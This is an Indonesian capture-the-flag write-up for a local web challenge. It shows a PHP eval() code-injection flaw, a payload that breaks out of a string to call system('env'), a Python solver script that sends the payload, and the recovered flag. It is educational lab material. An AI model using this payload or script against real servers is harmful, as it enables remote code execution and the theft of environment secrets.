# WriteUp: Rahasia Bahlil

## Overview

* **Judul:** Rahasia Bahlil
* **Kategori:** Input Injection
* **Poin:** 250
* **Deskripsi:** Bisa ngga lu mengungkap rahasia Bahlil?
* **Author:** (Unknown/Platform Specific)
* **URL:** `http://localhost:1337`

## Informasi Attachment

File yang diberikan adalah `codex1.yml`.

**Struktur Direktori:**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Input Injection/Rahasia Bahlil]
└─$ tree
.
├── codex1.yml
└── exploit.py

0 directories, 2 files

```

**Konten File (`codex1.yml`):**

```yaml
services:
  web:
    image: ghcr.io/hengkerrusia/codex1:latest
    ports:
      - "1337:8080"
    environment:
      - PWN=${PWN:-testuser}
    restart: unless-stopped

```

## Proses Penyelesaian

### 1. Menjalankan Environment

Challenge dijalankan menggunakan Docker Compose pada port **1337**.

**Output Terminal:**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Input Injection/Rahasia Bahlil]
└─$ PWN=WanZKey docker compose -f codex1.yml up -d --build
[+] up 17/17
 ✔ Image ghcr.io/hengkerrusia/codex1:latest Pulled                                                                  8.5s
 ✔ Network rahasiabahlil_default       Created                                                                      1.9s
 ✔ Container rahasiabahlil-web-1       Created                                                                      3.2s

```

### 2. Source Code Analysis (White Box)

Melakukan inspeksi file `index.php` di dalam container. Ditemukan kerentanan fatal pada penggunaan fungsi `eval()`.

**Snippet Vulnerable (`index.php`):**

```php
if (isset($_GET['title'])) {
    $user_input = $_GET['title'];

    try {
        // VULNERABILITY:
        // Input user dimasukkan ke dalam string double-quote, lalu dieksekusi oleh eval()
        eval("\$custom_message = \"Welcome to " . $user_input . "\";");
    } catch (ParseError $e) {
        // ...
    }
}

```

**Analisis Kerentanan:**

1. **Vulnerable Function:** `eval()`.
2. **Injection Context:** Input `$user_input` ditempatkan di dalam string PHP yang diapit oleh tanda kutip dua (`"`).
3. **Exploit Strategy:**
* Menutup string pembuka dengan tanda kutip dua (`"`).
* Mengakhiri statement assignment dengan titik koma (`;`).
* Menyisipkan perintah `system('env');` untuk eksekusi kode jarak jauh (RCE).
* Menambahkan komentar (`//`) untuk mengabaikan sisa kode asli agar tidak terjadi error sintaks.
* **Payload:** `"; system('env'); //`



### 3. Exploitation

Mengirimkan payload melalui parameter GET `title` untuk memicu RCE dan mendapatkan flag.

## Script Solver

Script Python untuk melakukan eksploitasi otomatis.

**File:** `exploit.py`

```python
import requests
import re

# Target URL (Port 1337)
URL = "http://localhost:1337"

def exploit():
    print(f"[*] Target: {URL}")
    
    # Payload PHP Code Injection
    # 1. ";          -> Tutup string dan statement PHP pertama
    # 2. system('env'); -> Jalanin perintah shell
    # 3. //          -> Comment sisa kode di belakang biar gak error syntax
    payload = "\"; system('env'); //"
    
    print(f"[*] Sending Payload: {payload}")
    
    try:
        # Kirim GET request ke parameter 'title'
        r = requests.get(URL, params={'title': payload})
        
        if r.status_code == 200:
            print("[+] Injection Successful!")
            
            # Cari flag format pwn{...}
            flag = re.search(r'pwn\{.*?\}', r.text)
            
            if flag:
                print(f"\n[!!!] FLAG FOUND: {flag.group(0)}\n")
            else:
                print("[-] Flag regex failed.")
                print(r.text[:500]) 
        else:
            print(f"[-] Error Status: {r.status_code}")
            
    except Exception as e:
        print(f"[-] Connection Error: {e}")

if __name__ == "__main__":
    exploit()

```

## Output Terminal Solver

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Input Injection/Rahasia Bahlil]
└─$ python3 exploit.py
[*] Target: http://localhost:1337
[*] Sending Payload: "; system('env'); //
[+] Injection Successful!

[!!!] FLAG FOUND: pwn{e25832e1dcf82e6ef453d49866a90d89}

```

## Flag

```
pwn{e25832e1dcf82e6ef453d49866a90d89}

```
